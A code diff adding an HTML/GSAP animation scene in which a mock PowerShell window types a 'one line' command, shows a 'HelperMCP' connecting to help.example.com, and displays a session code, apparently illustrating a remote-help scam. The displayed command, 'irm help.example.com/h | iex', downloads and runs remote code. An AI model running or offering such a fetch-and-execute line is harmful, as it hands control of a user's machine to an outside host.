@@ -1,0 +1,53 @@
+<!DOCTYPE html>
+<html>
+  <head><meta charset="UTF-8"></head>
+  <body>
+    <template>
+      <style>
+        #root { position: absolute; inset: 0; display: flex; align-items: center; justify-content: center; font-family: "JetBrains Mono", monospace; color: #d6ffe4; }
+        #s1-cap { position: absolute; left: 64px; top: 46px; font-size: 22px; color: #7fae8f; }
+        #s1-cap b { color: #38ff7a; font-weight: 700; }
+        #s1-win { width: 1000px; border: 2px solid #16482b; border-radius: 12px; background: #07140c; box-shadow: 0 30px 80px rgba(0, 0, 0, 0.6), 0 0 60px rgba(56, 255, 122, 0.1); overflow: hidden; }
+        #s1-bar { height: 48px; display: flex; align-items: center; gap: 12px; padding: 0 20px; border-bottom: 2px solid #16482b; background: #0a1d12; font-size: 20px; color: #7fae8f; }
+        #s1-bar i { width: 12px; height: 12px; border-radius: 50%; background: #2bb55a; display: block; }
+        #s1-body { padding: 26px 30px 34px; font-size: 25px; line-height: 1.55; }
+        .s1-ps { color: #7fae8f; }
+        #s1-cmd { color: #38ff7a; }
+        #s1-caret { display: inline-block; width: 13px; height: 26px; background: #38ff7a; vertical-align: -4px; margin-left: 2px; }
+        .s1-out { color: #b7d8c2; }
+        .s1-ok { color: #38ff7a; }
+        #s1-code { margin-top: 18px; display: flex; align-items: center; gap: 24px; padding: 18px 26px; border: 2px solid #2bb55a; border-radius: 10px; background: rgba(56, 255, 122, 0.07); width: 760px; }
+        #s1-code span { font-size: 22px; color: #7fae8f; }
+        #s1-code b { font-size: 50px; letter-spacing: 6px; color: #38ff7a; text-shadow: 0 0 22px rgba(56, 255, 122, 0.55); }
+      </style>
+      <div data-hf-id="hf-4igv" id="root" data-composition-id="s1-terminal" data-width="1280" data-height="720">
+        <div data-hf-id="hf-nera" id="s1-cap">1. your friend runs <b data-hf-id="hf-70fj">one line</b></div>
+        <div data-hf-id="hf-h2io" id="s1-win">
+          <div data-hf-id="hf-b8lh" id="s1-bar"><i data-hf-id="hf-wt6k"></i><i data-hf-id="hf-zeb8"></i><i data-hf-id="hf-y7e5"></i><span data-hf-id="hf-vdqf">Windows PowerShell</span></div>
+          <div data-hf-id="hf-gw92" id="s1-body">
+            <div data-hf-id="hf-yeow"><span data-hf-id="hf-6u59" class="s1-ps">PS C:\Users\anna&gt; </span><span data-hf-id="hf-syfx" id="s1-cmd"></span><span data-hf-id="hf-eet0" id="s1-caret"></span></div>
+            <div data-hf-id="hf-6fzx" class="s1-out" id="s1-o1">HelperMCP: connecting to help.example.com</div>
+            <div data-hf-id="hf-p9qg" class="s1-ok" id="s1-o2">connected, the code is copied to the clipboard</div>
+            <div data-hf-id="hf-gxjl" id="s1-code"><span data-hf-id="hf-2c40">session code</span><b data-hf-id="hf-nl9s">7FBV-HUVJ</b></div>
+          </div>
+        </div>
+      </div>
+      <script>
+        (function () {
+          const tl = gsap.timeline({ paused: true });
+          const cmd = "irm help.example.com/h | iex";
+          tl.fromTo("#s1-cap", { opacity: 0, x: -24 }, { opacity: 1, x: 0, duration: 0.4, ease: "power3.out" }, 0);
+          tl.fromTo("#s1-win", { opacity: 0, y: 40, scale: 0.96 }, { opacity: 1, y: 0, scale: 1, duration: 0.45, ease: "expo.out" }, 0.05);
+          const el = document.querySelector("#s1-cmd");
+          for (let i = 1; i <= cmd.length; i++) tl.set(el, { textContent: cmd.slice(0, i) }, 0.35 + i * 0.03);
+          tl.fromTo("#s1-caret", { opacity: 1 }, { opacity: 0, duration: 0.25, ease: "steps(1)", yoyo: true, repeat: 9 }, 0.35);
+          tl.fromTo("#s1-o1", { opacity: 0, x: -10 }, { opacity: 1, x: 0, duration: 0.25, ease: "power2.out" }, 1.35);
+          tl.fromTo("#s1-o2", { opacity: 0, x: -10 }, { opacity: 1, x: 0, duration: 0.25, ease: "power2.out" }, 1.65);
+          tl.fromTo("#s1-code", { opacity: 0, scale: 0.7 }, { opacity: 1, scale: 1, duration: 0.5, ease: "back.out(2.2)" }, 1.95);
+          tl.to("#root", { opacity: 0, duration: 0.2, ease: "power2.in" }, 3.0);
+          window.__timelines["s1-terminal"] = tl;
+        })();
+      </script>
+    </template>
+  </body>
+</html>
